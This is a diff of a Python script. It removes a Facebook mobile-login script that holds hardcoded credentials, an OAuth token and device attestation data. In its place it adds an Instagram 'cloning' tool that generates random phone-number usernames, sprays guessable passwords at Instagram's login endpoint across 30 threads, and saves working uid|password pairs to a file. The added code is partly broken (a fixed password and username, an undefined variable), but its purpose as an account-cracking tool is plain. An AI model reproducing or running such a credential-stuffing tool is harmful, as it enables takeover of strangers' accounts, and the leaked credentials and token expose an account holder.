@@ -1,112 +1,207 @@
-import requests
-import json
+###-------[IMPORT MODULES]-----------####
+ 
+import os
+import sys
 import time
-import re
 import uuid
-
-def x1():
-    """Generate a realistic Facebook mobile user-agent"""
-    return "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
-
-# Your credentials
-uid = "100065314603669"  # Replace with your Facebook email/phone
-pw = "7029507010"  # Replace with your password
-
-Session = requests.Session()
-
-# IMPORTANT: Get a fresh OAuth token from Facebook's official API
-# You cannot reuse the hardcoded one
-# Use Facebook's official login flow or Graph API
-
-Session.headers.update({
-    'host': 'b-graph.facebook.com',
-    'x-fb-connection-type': 'MOBILE.LTE',
-    'x-zero-state': 'unknown',
-    'user-agent': x1(),
-    'x-tigon-is-retry': 'False',
-    'x-fb-device-group': '4783',
-    'x-graphql-request-purpose': 'fetch',
-    'x-fb-privacy-context': '3643298472347298',
-    'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
-    'x-graphql-client-library': 'graphservice',
-    'content-type': 'application/x-www-form-urlencoded',
-    'x-fb-net-hni': '51011',
-    'x-fb-sim-hni': '51011',
-    # ⚠️ REPLACE THIS WITH A FRESH TOKEN:
-    'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-    'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
-    'x-fb-http-engine': 'Tigon/Liger',
-    'x-fb-client-ip': 'True',
-    'x-fb-server-cluster': 'True'
-})
-
-apcb = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
-
-data = {
-    'method': "post",
-    'pretty': "false",
-    'format': "json",
-    'server_timestamps': "true",
-    'locale': "id_ID",
-    'purpose': "fetch",
-    'fb_api_req_friendly_name': "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
-    'fb_api_caller_class': "graphservice",
-    'client_doc_id': "119940804214876861379510865434",  # This may be outdated
-    'variables': json.dumps({
-        "params": {
-            "params": "{\"params\":\"{\\\"client_input_params\\\":{\\\"sim_phones\\\":[],\\\"secure_family_device_id\\\":\\\"67db191d-c496-4ce6-b16a-40d465504065\\\",\\\"attestation_result\\\":{\\\"data\\\":\\\"eyJjaGFsbGVuZ2Vfbm9uY2UiOiIrZHJubFJJdndKSkxmUnR4TkdLRWlscWRHOUc2KzJPZWdsY1gyN1d0UEEwPSIsInVzZXJuYW1lIjoieHlhZmFqYXJAZ21haWwuY29tIn0=\\\",\\\"signature\\\":\\\"MEQCIDireQS4hTnMyBiyJckHln2WFJ65OU6a31Bx6JGyCjttAiBpZw4ixxyyyNNC0xMgiqmiAd1rVi8ZGsfyTrqvBIibqw==\\\",\\\"keyHash\\\":\\\"f344d852976b8878bd5ccda3f95074528c7564fcebcde45abc51c9b43bc234e4\\\"},\\\"has_granted_read_contacts_permissions\\\":0,\\\"auth_secure_device_id\\\":\\\"\\\",\\\"has_whatsapp_installed\\\":1,\\\"password\\\":\\\"" + apcb + "\\\",\\\"sso_token_map_json_string\\\":\\\"\\\",\\\"event_flow\\\":\\\"login_manual\\\",\\\"password_contains_non_ascii\\\":\\\"false\\\",\\\"sim_serials\\\":[],\\\"client_known_key_hash\\\":\\\"\\\",\\\"encrypted_msisdn\\\":\\\"\\\",\\\"has_granted_read_phone_permissions\\\":0,\\\"app_manager_id\\\":\\\"\\\",\\\"should_show_nested_nta_from_aymh\\\":0,\\\"device_id\\\":\\\"41889e22-bee8-4c81-8ec6-add9a221bd3f\\\",\\\"login_attempt_count\\\":1,\\\"machine_id\\\":\\\"\\\",\\\"flash_call_permission_status\\\":{\\\"READ_PHONE_STATE\\\":\\\"DENIED\\\",\\\"READ_CALL_LOG\\\":\\\"DENIED\\\",\\\"ANSWER_PHONE_CALLS\\\":\\\"DENIED\\\"},\\\"accounts_list\\\":[{},{}],\\\"family_device_id\\\":\\\"f7eab582-f690-4123-b350-132bb5ec5500\\\",\\\"fb_ig_device_id\\\":[],\\\"device_emails\\\":[],\\\"try_num\\\":1,\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\",\\\"lara_override\\\":\\\"\\\"},\\\"event_step\\\":\\\"home_page\\\",\\\"headers_infra_flow_id\\\":\\\"\\\",\\\"openid_tokens\\\":{},\\\"contact_point\\\":\\\"" + uid + "\\\"},\\\"server_params\\\":{\\\"should_trigger_override_login_2fa_action\\\":0,\\\"is_from_logged_out\\\":0,\\\"should_trigger_override_login_success_action\\\":0,\\\"login_credential_type\\\":\\\"none\\\",\\\"server_login_source\\\":\\\"login\\\",\\\"waterfall_id\\\":\\\"12020f76-d875-4059-82fc-93f8debb8784\\\",\\\"login_source\\\":\\\"Login\\\",\\\"is_platform_login\\\":0,\\\"pw_encryption_try_count\\\":1,\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"offline_experiment_group\\\":\\\"caa_iteration_v6_perf_fb_2\\\",\\\"is_from_landing_page\\\":0,\\\"password_text_input_id\\\":\\\"6vcvjp:102\\\",\\\"is_from_empty_password\\\":0,\\\"is_from_msplit_fallback\\\":0,\\\"ar_event_source\\\":\\\"login_home_page\\\",\\\"username_text_input_id\\\":\\\"6vcvjp:101\\\",\\\"layered_homepage_experiment_group\\\":null,\\\"device_id\\\":\\\"41889e22-bee8-4c81-8ec6-add9a221bd3f\\\",\\\"INTERNAL__latency_qpl_instance_id\\\":4.154659090078E13,\\\"reg_flow_source\\\":\\\"login_home_native_integration_point\\\",\\\"is_caa_perf_enabled\\\":1,\\\"credential_type\\\":\\\"password\\\",\\\"is_from_password_entry_page\\\":0,\\\"caller\\\":\\\"gslr\\\",\\\"family_device_id\\\":\\\"f7eab582-f690-4123-b350-132bb5ec5500\\\",\\\"is_from_assistive_id\\\":0,\\\"access_flow_version\\\":\\\"F2_FLOW\\\",\\\"is_from_logged_in_switcher\\\":0}}\"}",
-            "bloks_versioning_id": "3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5",
-            "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
-        },
-        "scale": "3",
-        "nt_context": {
-            "using_white_navbar": True,
-            "styles_id": "cfe75e13b386d5c54b1de2dcca1bee5a",
-            "pixel_ratio": 3,
-            "is_push_on": True,
-            "debug_tooling_metadata_token": None,
-            "is_flipper_enabled": False,
-            "theme_params": [],
-            "bloks_version": "3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5"
-        }
-    }),
-    'fb_api_analytics_tags': '["GraphServices"]',
-    'client_trace_id': str(uuid.uuid4())
-}
-
-try:
-    response = Session.post('https://b-graph.facebook.com/graphql', data=data, allow_redirects=True, timeout=30)
-    
-    print(f"Status Code: {response.status_code}")
-    print(f"Response: {response.text[:500]}...")  # Print first 500 chars
-    
-    if response.status_code == 200:
-        if "c_user" in response.text and "access_token" in response.text:
-            cookie_raw = re.sub(r'\\(?!/)', '', response.text)
-            match = re.search(r'"session_cookies"\s*:\s*(\[[^\]]+\])', cookie_raw)
-            if match:
-                cookies_raw = match.group(1)
-                cookies_json = json.loads(cookies_raw)
-                cok = ";".join(f'{c["name"]}={c["value"]}' for c in cookies_json)
-                c_user = next((c["value"] for c in cookies_json if c["name"] == "c_user"), None)
-                print(f"\n✅ SUCCESS: Logged in as {c_user}")
-                print(f"Cookies: {cok}")
-                
-                # Optional: Save to file (modify path for your system)
-                # with open("facebook_session.txt", "w") as f:
-                #     f.write(f"{c_user}|{pw}|{cok}\n")
-        else:
-            print("❌ Login failed - check your credentials or 2FA requirements")
-            # Parse error message
-            try:
-                error_data = json.loads(response.text)
-                print(f"Error: {error_data.get('errors', [{}])[0].get('message', 'Unknown error')}")
-            except:
-                print("Could not parse error response")
+import json
+import string
+import random
+import requests
+from requests.exceptions import ConnectionError
+from concurrent.futures import ThreadPoolExecutor
+from datetime import datetime 
+###-------[BASIC COLORS]-----------####
+reset = "\033[0m"
+red = "\033[1;31m"
+green = "\033[1;32m"
+yellow = "\033[1;33m"
+blue = "\033[1;34m"
+cyan = "\033[1;36m"
+white = "\033[1;37m"
+ 
+###-------[FLASH COLORS]-----------####
+colors = ["\033[1;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]
+ 
+###-------[LOOP]-----------####
+loop = 0
+idz = []
+oks = []
+cps = []
+ 
+sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛instagram 🙂💗 \x07')
+ 
+try:os.mkdir('/sdcard/XYZ')
+except:pass
+ 
+ 
+###-------[LOGO]-----------####
+logo= f'''\033[1;97m---------------------------------------------------
+ \033[1;97m[\033[1;92m•\033[1;97m] Author   : sumon roy
+\033[1;97m---------------------------------------------------'''
+ 
+ 
+###-------[CLEAR TERMINAL]-----------####
+def clear():
+    os.system("clear")
+    print(logo)
+ 
+ 
+ 
+###-------[LINE]-----------####
+def linex():
+    print(f"\033[1;97m--------------------------------------------------")
+ 
+ 
+ 
+###-------[MSIN MENU]-----------####
+def menu():
+    clear()
+    print(f" \033[1;97m[\033[1;92m01\033[1;97m] RANDOM NUMBER CLONING")
+    print(f" \033[1;97m[\033[1;92m02\033[1;97m] \033[1;32mCONTACT DEVELOPER")
+    linex()
+    younisxyz = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : ")
+    if younisxyz in ['1','01']:
+        random_number()
+    elif younisxyz in ['2','02']:
+        os.system("xdg-open ")
+        time.sleep(3)
+        menu()
     else:
-        print(f"❌ HTTP Error: {response.status_code}")
-        
-except requests.exceptions.RequestException as e:
-    print(f"❌ Request failed: {e}")
-except Exception as e:
-    print(f"❌ Unexpected error: {e}")
+        print(f"\n\033[1;91m Select valid option ....")
+        time.sleep(3)
+        menu()
+ 
+ 
+###-------[DEF CLONING]-----------####
+def random_number():
+    clear()
+    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m0310, 0320, 0330, 0340 ")
+    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
+    linex()
+    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Code  :\033[1;92m ")
+    try:
+        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit :\033[1;92m "))
+    except ValueError:
+        limit = 5000
+    for _ in range(limit):
+        x = "".join(random.choice(string.digits) for _ in range(6))
+        idz.append(x)
+    with ThreadPoolExecutor(max_workers=30) as XYZ:
+        clear()
+        total_idz = str(len(idz))
+        print(f"\033[1;96m KING IS ALWAYS KING")
+        print(f"\033[1;96m SOME RESPECT")
+        linex()
+        print(f' \033[1;32m(√) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
+        print(' \033[1;37m{\033[1;32m+\033[1;37m} \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
+        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP");print(' \033[1;33m[•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/XYZ')
+        linex()
+        for xyz in idz:
+            uid = code+xyz
+            pww = ['57273200',uid[:6],uid[:8],uid] 
+         #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
+            XYZ.submit(crack, uid, pww, total_idz)
+    linex()
+    print(f" \033[1;97m[\033[1;92m!\033[1;97m] Process Completed ")
+    print(f" \033[1;97m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
+    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Total Cp Accounts : \033[1;91m{str(len(cps))} ")
+    linex()
+    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter To Back ")
+    menu()
+ 
+ 
+###-------[METHOD CRACK]-----------####
+def crack(uid, pww, total_idz):
+    global loop
+    global oks
+    global cps
+    x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
+    sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
+    sys.stdout.flush()
+    try:
+        for pw in pww:
+            session = requests.Session()
+            time_now = int(datetime.now().timestamp())
+            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{'57273200'}"
+            response = session.get('https://www.instagram.com/accounts/login/')
+            csrftoken = response.cookies.get('csrftoken')
+            cookies ={
+                'csrftoken': csrftoken,
+                'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
+                'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
+                'ig_nrcb': '1',
+                'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
+                'ps_l': '1',
+                'ps_n': '1',
+                'wd': '885x773',}
+            data = {
+                "enc_password": enc_password,
+                'optIntoOneTap': 'false',
+                'queryParams': '{"hl":"en"}',
+                'trustedDeviceRecords': '{}',
+                'username': '6377881527',}
+            headers = {
+                'authority': 'www.instagram.com',
+                'accept': '*/*',
+                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
+                'content-type': 'application/x-www-form-urlencoded',
+                # 'cookie': 'csrftoken=4M2PbXXQYNEmDdxrQg01NL; mid=ZsCYoAALAAGlcbYkVN23DYxQwevD; ig_did=E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B; ig_nrcb=1; datr=npjAZqX5wY3c_CtTDAvR0Ls3; ps_l=1; ps_n=1; wd=885x773',
+                'origin': 'https://www.instagram.com',
+                'priority': 'u=1, i',
+                'referer': 'https://www.instagram.com/accounts/login/?hl=en',
+                'sec-ch-prefers-color-scheme': 'dark',
+                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-model': '""',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-ch-ua-platform-version': '"10.0.0"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+                'x-asbd-id': '129477',
+                'x-csrftoken': csrftoken,
+                'x-ig-app-id': '936619743392459',
+                'x-ig-www-claim': '0',
+                'x-instagram-ajax': '1015820104',
+                'x-requested-with': 'XMLHttpRequest',}
+            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
+            response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
+            session_cookies = response.cookies.get_dict()
+            if response.status_code == 200:
+                json_response = response.json()
+                if json_response.get('status') == 'ok':
+                   if json_response.get('authenticated') == True:
+                        cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
+                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                        print(f"\r\033[1;92m [COK] {cookies} ")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
+                        oks.append(uid)
+                        return True
+                   elif json_response.get('auth_token'):
+                        cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
+                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                        print(f"\r\033[1;92m [COK] {cookies} ")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
+                        oks.append(uid)
+                        return True
+            elif 'sessionid' in session_cookies:
+                        cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
+                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                        print(f"\r\033[1;92m [COK] {cookies} ")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
+                        oks.append(uid)
+                        return True
+            else:
+                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
+                continue
+        loop+=1
+    except ConnectionError:
+        time.sleep(10)
+    except:
+        pass
+menu()
+ 
+ 
